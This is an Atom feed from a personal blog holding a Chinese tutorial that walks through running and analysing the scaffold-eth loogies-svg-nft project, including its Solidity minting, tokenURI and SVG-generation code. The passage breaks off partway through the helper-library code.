<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>QIWIHUI</title>
  
  <subtitle>Don&#39;t be evil or greedy.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://qiwihui.com/"/>
  <updated>2024-05-15T02:25:31.470Z</updated>
  <id>https://qiwihui.com/</id>
  
  <author>
    <name>qiwihui</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SVG NFT 全面实践 ── scaffold-eth loogies-svg-nft 项目完整指南</title>
    <link href="https://qiwihui.com/qiwihui-blog-153/"/>
    <id>https://qiwihui.com/qiwihui-blog-153/</id>
    <published>2024-05-15T02:25:31.442Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>注：这篇文章是我投稿于“李大狗Leeduckgo”公众号的文章，原文地址：<a href="https://mp.weixin.qq.com/s/WvTFk3E6FjfHtXfp2uHkrw">SVG NFT 全面实践 | Web3.0 dApp 开发（六）</a>。</p><hr><p>loogies-svg-nft 是 scaffold-eth 提供的一个简单的 NFT 铸造和展示的项目，在本教程中，我们将带领大家一步步分析和实现这个项目。</p><p>由于项目的 <code>loogies-svg-nft</code> 分支与 <code>master</code> 分支在组件库和主页上有一些变化，故先将 <code>master</code> 分支代码与 <code>loogies-svg-nft</code> 分支进行了合并，解决冲突，得到一份基新组件库的全新的代码。可以参考项目地址： <a href="https://github.com/qiwihui/scaffold-eth.git">https://github.com/qiwihui/scaffold-eth.git</a> 的 <code>loogies-svg-nft</code> 分支。本文以下内容将基于这些代码进行部署和分析。</p><span id="more"></span><h2><span id="ben-di-yun-xing-he-ce-shi">本地运行和测试</span></h2><p>首先我们先运行项目查看我们将要分析实现的功能。</p><h3><span id="ben-di-yun-xing">本地运行</span></h3><p>首先我们在本地运行项目：</p><p>clone 项目并切换到 <code>loogies-svg-nft</code> 分支：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/qiwihui/scaffold-eth.git loogies-svg-nft</span><br><span class="line"><span class="built_in">cd</span> loogies-svg-nft</span><br><span class="line">git checkout loogies-svg-nft</span><br></pre></td></tr></table></figure><p>安装依赖包</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn install</span><br></pre></td></tr></table></figure><p>运行前端</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn start</span><br></pre></td></tr></table></figure><p>在第二个终端窗口中，运行本地测试链</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn chain</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/153822009-3154003e-6433-4a29-a511-b33b5f37a99a.png" alt="yarn-chain"></p><p>在第三个终端窗口中，运行部署合约</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn deploy</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/153822065-4c4a0ffa-95e3-4e16-8272-ace2f102625b.png" alt="yarn-deploy"></p><p>此时在浏览器中访问 <a href="http://localhost:3000/"><code>http://localhost:3000</code></a> ，就可以看到程序了。</p><p><img src="https://user-images.githubusercontent.com/3297411/153822123-f6f7e3b0-ac6e-4625-a0bd-9bc4170d6aeb.png" alt="yarn-start"></p><h3><span id="ben-di-ce-shi">本地测试</span></h3><ol><li><p>首先在 MetaMask 钱包中添加本地网络，并切换到本地网络；</p><ul><li>网络名称： <code>Localhost 8545</code></li><li>新增 RPC URL： <code>http://localhost:8545</code></li><li>链 ID： <code>31337</code></li><li>Currency Symbol： <code>ETH</code></li></ul></li><li><p>创建一个新的本地钱包账号；</p></li><li><p>复制钱包地址，在页面左下角给这个地址发送一些测试 ETH；</p></li><li><p>点击在页面右上角 <code>connect</code> 连接钱包；</p></li><li><p>点击 Mint 铸造；</p></li><li><p>当交易成功后，可以看到新铸造的 NFT；</p><p><img src="https://user-images.githubusercontent.com/3297411/153822198-6442f4d1-fa49-43e1-bb7c-eacc1b1d082d.png" alt="nft-display"></p></li></ol><p>下面，我们开始对项目合约进行分析。</p><h2><span id="loogies-he-yue-fen-xi">Loogies 合约分析</span></h2><h3><span id="nft-yu-erc721">NFT 与 ERC721</span></h3><p><strong>NFT</strong>，全称为Non-Fungible Token，指非同质化代币，对应于以太坊上 ERC-721 标准。 一般在智能合约中，NFT 的定义包含 <code>tokenId</code> 和 <code>tokenURI</code> ，每一个 NFT 的 <code>tokenId</code> 是唯一的， <code>tokenURI</code> 对于保存了NFT的元数据，可以是图像URL、描述、属性等。如果一个 NFT 想在 NFT 市场上进行展示和销售，则 <code>tokenURI</code> 内容需要对应符合 NFT 市场的标准，比如，在 NFT 市场 OpenSea <a href="https://docs.opensea.io/docs/metadata-standards">元数据标准</a>中，就指出了 NFT 展示需要设置的属性。</p><p><img src="https://user-images.githubusercontent.com/3297411/153822292-ac9fa169-199b-49cb-b8bd-4ec3e680842c.png" alt="OpenSea 中 NFT 元数据与展示对应关系"></p><p>OpenSea 中 NFT 元数据与展示对应关系</p><h3><span id="he-yue-gai-lan">合约概览</span></h3><p><a href="https://github.com/scaffold-eth/scaffold-eth/tree/loogies-svg-nft">loogies-svg-nft 项目</a>的合约文件在 <code>packages/hardhat/contracts/</code> 路径下，包含以下三个文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">packages/hardhat/contracts/</span><br><span class="line">├── HexStrings.sol</span><br><span class="line">├── ToColor.sol</span><br><span class="line">└── YourCollectible.sol</span><br></pre></td></tr></table></figure><ul><li><code>HexString.sol</code> ：生成地址字符串；</li><li><code>ToColor.sol</code>：生成颜色编码字符串；</li><li><code>YourCollectible.sol</code>： <code>Loogies</code> NFT的合约文件，主要功能涉及合约铸造和元数据生成。</li></ul><p>合约的主要结构和方法为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract YourCollectible is ERC721, Ownable &#123;</span><br><span class="line"></span><br><span class="line">// 构造函数</span><br><span class="line">  constructor() public ERC721(&quot;Loogies&quot;, &quot;LOOG&quot;) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  // 铸造 NFT</span><br><span class="line">  function mintItem()</span><br><span class="line">      public</span><br><span class="line">      returns (uint256)</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">// 获取 tokenId 对应 tokeURI</span><br><span class="line">  function tokenURI(uint256 id) public view override returns (string memory) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">// 生成 tokenId 对应 svg 代码</span><br><span class="line">  function generateSVGofTokenById(uint256 id) internal view returns (string memory) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">// 生成 tokenId 对应 svg 代码，主要用于绘制图像</span><br><span class="line">  function renderTokenById(uint256 id) public view returns (string memory) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="gou-zao-han-shu">构造函数</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor() public ERC721(&quot;Loogies&quot;, &quot;LOOG&quot;) &#123;</span><br><span class="line">    // RELEASE THE LOOGIES!</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>代币符号： <code>Loogies</code></p><p>代币名称： <code>LOOG</code></p><p>合约继承自 OpenZeppelin 的 <code>ERC721.sol</code>，这是 OpenZeppelin 提供的基本合约代码，可以方便开发者使用。</p><h3><span id="ying-yong-ku-han-shu">应用库函数</span></h3><p>合约中分别对 <code>uint256</code>， <code>uint160</code> 和 <code>bytes3</code> 等应用了不同库函数，扩展对应功能：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 使 uint256 具有 toHexString 功能</span><br><span class="line">using Strings for uint256;</span><br><span class="line">// 使 uint160 具有自定义 toHexString 功能</span><br><span class="line">using HexStrings for uint160;</span><br><span class="line">// 使 bytes3 可以方便生成前端颜色表示</span><br><span class="line">using ToColor for bytes3;</span><br><span class="line">// 计数功能</span><br><span class="line">using Counters for Counters.Counter;</span><br></pre></td></tr></table></figure><h3><span id="mint-qi-xian">Mint 期限</span></h3><p>以下代码是 Mint 时间限制：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 mintDeadline = block.timestamp + 24 hours;</span><br><span class="line"></span><br><span class="line">function mintItem()</span><br><span class="line">      public</span><br><span class="line">      returns (uint256)</span><br><span class="line">  &#123;</span><br><span class="line">      require( block.timestamp &lt; mintDeadline, &quot;DONE MINTING&quot;);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>合约在部署之后的24小时内可以铸造，超过24小时则会引发异常。这个机制类似于预售，由于这个合约比较简单，所以没有使用白名单机制，一般在实际情况，会使用预售和白名单的方式来控制 NFT 的发行。</p><h3><span id="mint-zhu-zao">Mint 铸造</span></h3><p>铸造 NFT 其实就是在合约中设置两个信息：</p><ul><li><code>tokenId</code> 及其 <code>owner</code></li><li><code>tokenId</code> 及其 <code>tokenURI</code></li></ul><p>我们首先看铸造函数 <code>mintItem</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 用于保存每一个铸造的 Loogies 的特征，其中，color 表示颜色，chubbiness 表示胖瘦</span><br><span class="line">mapping (uint256 =&gt; bytes3) public color;</span><br><span class="line">mapping (uint256 =&gt; uint256) public chubbiness;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">function mintItem()</span><br><span class="line">      public</span><br><span class="line">      returns (uint256)</span><br><span class="line">  &#123;</span><br><span class="line">      require( block.timestamp &lt; mintDeadline, &quot;DONE MINTING&quot;);</span><br><span class="line">// 每次铸造前自增 _tokenIds，确保 _tokenIds 唯一</span><br><span class="line">      _tokenIds.increment();</span><br><span class="line"></span><br><span class="line">      uint256 id = _tokenIds.current();</span><br><span class="line">// 铸造者与 tokenId 绑定</span><br><span class="line">      _mint(msg.sender, id);</span><br><span class="line">// 随机生成对应 tokenId 的属性</span><br><span class="line">      bytes32 predictableRandom = keccak256(abi.encodePacked( blockhash(block.number-1), msg.sender, address(this), id ));</span><br><span class="line">      color[id] = bytes2(predictableRandom[0]) | ( bytes2(predictableRandom[1]) &gt;&gt; 8 ) | ( bytes3(predictableRandom[2]) &gt;&gt; 16 );</span><br><span class="line">      chubbiness[id] = 35+((55*uint256(uint8(predictableRandom[3])))/255);</span><br><span class="line"></span><br><span class="line">      return id;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>tokenId</code> 在每次铸造时会自增，确保 <code>tokenId</code> 唯一；</li><li><code>_mint</code> 函数绑定 <code>tokenId</code> 及其 <code>owner</code>；</li><li>每一个 <code>tokenId</code> 对应的属性通过随机方式生成，具体为：<ul><li>通过前一个区块的哈希（ <code>blockhash(block.number-1)</code> ），当前铸造账户（ <code>msg.sender</code>），合约地址（ <code>address(this)</code> ）和 <code>tokenId</code> 生成哈希 <code>predictableRandom</code>；</li><li>计算 NFT 颜色：按位或 <code>predictableRandom</code> 前三位得到颜色，颜色表示用 bytes3 表示，其中 <code>bytes2(predictableRandom[0])</code> 对应最低位蓝色数值， <code>( bytes2(predictableRandom[1]) &gt;&gt; 8 )</code>对应中间位绿色数值， <code>( bytes3(predictableRandom[2]) &gt;&gt; 16 )</code> 对应最高位红色数值；</li><li>计算 NFT 胖瘦： <code>35+((55*uint256(uint8(predictableRandom[3])))/255);</code> ，<code>uint8(predictableRandom[3])</code>介于0~255，故最小值为35，最大值为 35+55 = 90；</li></ul></li></ul><p>例如： <code>color</code> 为 <code>0x4cc4c1</code> ， <code>chubbiness</code> 为 88 时对应的 NFT 图片为：</p><p><img src="https://user-images.githubusercontent.com/3297411/153822433-3a1a41a4-f846-45f9-b74e-f699ccba6a81.png" alt="loogies-1"></p><h3><span id="tokenuri-han-shu">tokenURI 函数</span></h3><p>函数 <code>tokenURI</code> 接受 <code>tokenId</code> 参数，返回编码之后的元数据字符串：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function tokenURI(uint256 id) public view override returns (string memory) &#123;</span><br><span class="line">// 检查 id 是否存在</span><br><span class="line">      require(_exists(id), &quot;not exist&quot;);</span><br><span class="line">      string memory name = string(abi.encodePacked(&#x27;Loogie #&#x27;,id.toString()));</span><br><span class="line">      string memory description = string(abi.encodePacked(&#x27;This Loogie is the color #&#x27;,color[id].toColor(),&#x27; with a chubbiness of &#x27;,uint2str(chubbiness[id]),&#x27;!!!&#x27;));</span><br><span class="line">      // 生成图片的svg base64 编码</span><br><span class="line">string memory image = Base64.encode(bytes(generateSVGofTokenById(id)));</span><br><span class="line"></span><br><span class="line">      return</span><br><span class="line">          string(</span><br><span class="line">              abi.encodePacked(</span><br><span class="line">                &#x27;data:application/json;base64,&#x27;,</span><br><span class="line">// 通过 base64 编码元数据</span><br><span class="line">                Base64.encode(</span><br><span class="line">                    bytes(</span><br><span class="line">                          abi.encodePacked(</span><br><span class="line">                              &#x27;&#123;&quot;name&quot;:&quot;&#x27;,</span><br><span class="line">                              name,</span><br><span class="line">                              &#x27;&quot;, &quot;description&quot;:&quot;&#x27;,</span><br><span class="line">                              description,</span><br><span class="line">                              &#x27;&quot;, &quot;external_url&quot;:&quot;https://burnyboys.com/token/&#x27;,</span><br><span class="line">                              id.toString(),</span><br><span class="line">                              &#x27;&quot;, &quot;attributes&quot;: [&#123;&quot;trait_type&quot;: &quot;color&quot;, &quot;value&quot;: &quot;#&#x27;,</span><br><span class="line">                              color[id].toColor(),</span><br><span class="line">                              &#x27;&quot;&#125;,&#123;&quot;trait_type&quot;: &quot;chubbiness&quot;, &quot;value&quot;: &#x27;,</span><br><span class="line">                              uint2str(chubbiness[id]),</span><br><span class="line">                              &#x27;&#125;], &quot;owner&quot;:&quot;&#x27;,</span><br><span class="line">                              (uint160(ownerOf(id))).toHexString(20),</span><br><span class="line">                              &#x27;&quot;, &quot;image&quot;: &quot;&#x27;,</span><br><span class="line">                              &#x27;data:image/svg+xml;base64,&#x27;,</span><br><span class="line">                              image,</span><br><span class="line">                              &#x27;&quot;&#125;&#x27;</span><br><span class="line">                          )</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">              )</span><br><span class="line">          );</span><br><span class="line">  &#125;</span><br><span class="line">// 生成的 SVG 字符串</span><br><span class="line">function generateSVGofTokenById(uint256 id) internal view returns (string memory) &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 绘制图像</span><br><span class="line">// Visibility is `public` to enable it being called by other contracts for composition.</span><br><span class="line">function renderTokenById(uint256 id) public view returns (string memory) &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中， <code>generateSVGofTokenById</code> 函数返回 <code>tokenId</code> 对应的颜色和胖瘦属性生成的 SVG 字符串， <code>renderTokenById</code> 用户绘制图像。</p><p>我们可以看到，NFT 元数据中包含的属性有：</p><ul><li>name：名称</li><li>description： 描述</li><li>external_url：外部链接</li><li>attributes：属性<ul><li>color 颜色</li><li>chubbiness：胖瘦</li><li>owner：所有者，以太坊地址16进制形式</li><li>image：图片对应 SVG 的 base64 编码</li></ul></li></ul><p>这里，我们通过实际数据了解一下什么是 SVG。<code>tokenId</code> 为 1 时对应的 <code>tokenURI</code> 结果为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">data:application/json;<span class="built_in">base64</span>,eyJuYW1lIjoiTG9vZ2llICMxIiwiZGVzY3JpcHRpb24iOiJUaGlzIExvb2dpZSBpcyB0aGUgY29sb3IgIzRjYzRjMSB3aXRoIGEgY2h1YmJpbmVzcyBvZiA4OCEhISIsImV4dGVybmFsX3VybCI6Imh0dHBzOi8vYnVybnlib3lzLmNvbS90b2tlbi8xIiwiYXR0cmlidXRlcyI6W3sidHJhaXRfdHlwZSI6ImNvbG9yIiwidmFsdWUiOiIjNGNjNGMxIn0seyJ0cmFpdF90eXBlIjoiY2h1YmJpbmVzcyIsInZhbHVlIjo4OH1dLCJvd25lciI6IjB4MTY5ODQxYWEzMDI0Y2ZhNTcwMDI0ZWI3ZGQ2YmY1Zjc3NDA5MjA4OCIsImltYWdlIjoiZGF0YTppbWFnZS9zdmcreG1sO2Jhc2U2NCxQSE4yWnlCM2FXUjBhRDBpTkRBd0lpQm9aV2xuYUhROUlqUXdNQ0lnZUcxc2JuTTlJbWgwZEhBNkx5OTNkM2N1ZHpNdWIzSm5Mekl3TURBdmMzWm5JajQ4WnlCcFpEMGlaWGxsTVNJK1BHVnNiR2x3YzJVZ2MzUnliMnRsTFhkcFpIUm9QU0l6SWlCeWVUMGlNamt1TlNJZ2NuZzlJakk1TGpVaUlHbGtQU0p6ZG1kZk1TSWdZM2s5SWpFMU5DNDFJaUJqZUQwaU1UZ3hMalVpSUhOMGNtOXJaVDBpSXpBd01DSWdabWxzYkQwaUkyWm1aaUl2UGp4bGJHeHBjSE5sSUhKNVBTSXpMalVpSUhKNFBTSXlMalVpSUdsa1BTSnpkbWRmTXlJZ1kzazlJakUxTkM0MUlpQmplRDBpTVRjekxqVWlJSE4wY205clpTMTNhV1IwYUQwaU15SWdjM1J5YjJ0bFBTSWpNREF3SWlCbWFXeHNQU0lqTURBd01EQXdJaTgrUEM5blBqeG5JR2xrUFNKb1pXRmtJajQ4Wld4c2FYQnpaU0JtYVd4c1BTSWpOR05qTkdNeElpQnpkSEp2YTJVdGQybGtkR2c5SWpNaUlHTjRQU0l5TURRdU5TSWdZM2s5SWpJeE1TNDRNREEyTlNJZ2FXUTlJbk4yWjE4MUlpQnllRDBpT0RnaUlISjVQU0kxTVM0NE1EQTJOU0lnYzNSeWIydGxQU0lqTURBd0lpOCtQQzluUGp4bklHbGtQU0psZVdVeUlqNDhaV3hzYVhCelpTQnpkSEp2YTJVdGQybGtkR2c5SWpNaUlISjVQU0l5T1M0MUlpQnllRDBpTWprdU5TSWdhV1E5SW5OMloxOHlJaUJqZVQwaU1UWTRMalVpSUdONFBTSXlNRGt1TlNJZ2MzUnliMnRsUFNJak1EQXdJaUJtYVd4c1BTSWpabVptSWk4K1BHVnNiR2x3YzJVZ2NuazlJak11TlNJZ2NuZzlJak1pSUdsa1BTSnpkbWRmTkNJZ1kzazlJakUyT1M0MUlpQmplRDBpTWpBNElpQnpkSEp2YTJVdGQybGtkR2c5SWpNaUlHWnBiR3c5SWlNd01EQXdNREFpSUhOMGNtOXJaVDBpSXpBd01DSXZQand2Wno0OEwzTjJaejQ9In0=</span><br></pre></td></tr></table></figure><p>通过 base64 解码 <code>data:application/json;base64,</code> 之后的字符串可以得到如下 json（以下 json 经过了格式化，方便阅读）：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Loogie #1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;This Loogie is the color #4cc4c1 with a chubbiness of 88!!!&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;external_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://burnyboys.com/token/1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;attributes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;color&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#4cc4c1&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chubbiness&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">88</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;owner&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x169841aa3024cfa570024eb7dd6bf5f774092088&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAwIiBoZWlnaHQ9IjQwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyBpZD0iZXllMSI+PGVsbGlwc2Ugc3Ryb2tlLXdpZHRoPSIzIiByeT0iMjkuNSIgcng9IjI5LjUiIGlkPSJzdmdfMSIgY3k9IjE1NC41IiBjeD0iMTgxLjUiIHN0cm9rZT0iIzAwMCIgZmlsbD0iI2ZmZiIvPjxlbGxpcHNlIHJ5PSIzLjUiIHJ4PSIyLjUiIGlkPSJzdmdfMyIgY3k9IjE1NC41IiBjeD0iMTczLjUiIHN0cm9rZS13aWR0aD0iMyIgc3Ryb2tlPSIjMDAwIiBmaWxsPSIjMDAwMDAwIi8+PC9nPjxnIGlkPSJoZWFkIj48ZWxsaXBzZSBmaWxsPSIjNGNjNGMxIiBzdHJva2Utd2lkdGg9IjMiIGN4PSIyMDQuNSIgY3k9IjIxMS44MDA2NSIgaWQ9InN2Z181IiByeD0iODgiIHJ5PSI1MS44MDA2NSIgc3Ryb2tlPSIjMDAwIi8+PC9nPjxnIGlkPSJleWUyIj48ZWxsaXBzZSBzdHJva2Utd2lkdGg9IjMiIHJ5PSIyOS41IiByeD0iMjkuNSIgaWQ9InN2Z18yIiBjeT0iMTY4LjUiIGN4PSIyMDkuNSIgc3Ryb2tlPSIjMDAwIiBmaWxsPSIjZmZmIi8+PGVsbGlwc2Ugcnk9IjMuNSIgcng9IjMiIGlkPSJzdmdfNCIgY3k9IjE2OS41IiBjeD0iMjA4IiBzdHJva2Utd2lkdGg9IjMiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iIzAwMCIvPjwvZz48L3N2Zz4=&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>我们对 <code>image</code> 字段进行解码并格式化就得到图片的 SVG：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">g</span> <span class="attr">id</span>=<span class="string">&quot;eye1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">stroke-width</span>=<span class="string">&quot;3&quot;</span> <span class="attr">ry</span>=<span class="string">&quot;29.5&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;29.5&quot;</span> <span class="attr">id</span>=<span class="string">&quot;svg_1&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;154.5&quot;</span> <span class="attr">cx</span>=<span class="string">&quot;181.5&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#000&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#fff&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">ry</span>=<span class="string">&quot;3.5&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;2.5&quot;</span> <span class="attr">id</span>=<span class="string">&quot;svg_3&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;154.5&quot;</span> <span class="attr">cx</span>=<span class="string">&quot;173.5&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;3&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#000&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#000000&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">g</span> <span class="attr">id</span>=<span class="string">&quot;head&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">fill</span>=<span class="string">&quot;#4cc4c1&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;3&quot;</span> <span class="attr">cx</span>=<span class="string">&quot;204.5&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;211.80065&quot;</span> <span class="attr">id</span>=<span class="string">&quot;svg_5&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;88&quot;</span> <span class="attr">ry</span>=<span class="string">&quot;51.80065&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#000&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">g</span> <span class="attr">id</span>=<span class="string">&quot;eye2&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">stroke-width</span>=<span class="string">&quot;3&quot;</span> <span class="attr">ry</span>=<span class="string">&quot;29.5&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;29.5&quot;</span> <span class="attr">id</span>=<span class="string">&quot;svg_2&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;168.5&quot;</span> <span class="attr">cx</span>=<span class="string">&quot;209.5&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#000&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#fff&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">ry</span>=<span class="string">&quot;3.5&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;3&quot;</span> <span class="attr">id</span>=<span class="string">&quot;svg_4&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;169.5&quot;</span> <span class="attr">cx</span>=<span class="string">&quot;208&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;3&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#000000&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#000&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SVG是一种用 XML 定义的语言，用来描述二维矢量及矢量/栅格图形。它可以任意放大图形显示，也不会牺牲图像质量，它可以使用代码进行描述，方便编辑，因此被广泛使用。</p><p>从上面的代码结合以下的图像可以看出，这个 SVG 包含如下内容：</p><ul><li>第一行为 XML 声明，标明版本和编码类型，之后是SVG 的宽度和高度；</li><li><code>eye1</code>：由两个椭圆（ellipse）绘制的眼圈和黑色眼珠；</li><li><code>head</code>：填充 <code>#4cc4c1</code> 颜色的椭圆作为身体；</li><li><code>eye2</code>：与 <code>eye1</code> 一致，位置不同；</li></ul><p><code>eye1</code>，<code>head</code>和<code>eye2</code>依次叠加得到最终的图形：</p><p><img src="https://user-images.githubusercontent.com/3297411/153822497-6cdd7677-9594-4e78-8bc1-8f1b4c1158b8.png" alt="loogies-1"></p><h3><span id="fu-zhu-han-shu-jie-xi">辅助函数解析</span></h3><ol><li><code>uint2str</code> 将 <code>uint</code> 转变为字符串，例如 <code>123</code> 变为 <code>'123'</code></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function uint2str(uint _i) internal pure returns (string memory _uintAsString) &#123;</span><br><span class="line">      if (_i == 0) &#123;</span><br><span class="line">          return &quot;0&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      uint j = _i;</span><br><span class="line">// uint 位数</span><br><span class="line">      uint len;</span><br><span class="line">      while (j != 0) &#123;</span><br><span class="line">          len++;</span><br><span class="line">          j /= 10;</span><br><span class="line">      &#125;</span><br><span class="line">      bytes memory bstr = new bytes(len);</span><br><span class="line">      uint k = len;</span><br><span class="line">      while (_i != 0) &#123;</span><br><span class="line">          k = k-1;</span><br><span class="line">    // _i 个位数字</span><br><span class="line">          uint8 temp = (48 + uint8(_i - _i / 10 * 10));</span><br><span class="line">          bytes1 b1 = bytes1(temp);</span><br><span class="line">          bstr[k] = b1;</span><br><span class="line">          _i /= 10;</span><br><span class="line">      &#125;</span><br><span class="line">      return string(bstr);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ol><li><code>ToColor.sol</code> 库：将 <code>byte3</code> 类型转换为前端颜色字符串，例如：输入 <code>0x4cc4c1</code> 输出 <code>'4cc4c1'</code></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">library ToColor &#123;</span><br><span class="line">    bytes16 internal constant ALPHABET = &#x27;0123456789abcdef&#x27;;</span><br><span class="line"></span><br><span class="line">    function toColor(bytes3 value) internal pure returns (string memory) &#123;</span><br><span class="line">      bytes memory buffer = new bytes(6);</span><br><span class="line">      for (uint256 i = 0; i &lt; 3; i++) &#123;</span><br><span class="line">          buffer[i*2+1] = ALPHABET[uint8(value[i]) &amp; 0xf];</span><br><span class="line">          buffer[i*2] = ALPHABET[uint8(value[i]&gt;&gt;4) &amp; 0xf];</span><br><span class="line">      &#125;</span><br><span class="line">      return string(buffer);</span><br><span class="line">    &#125;</span><br><span 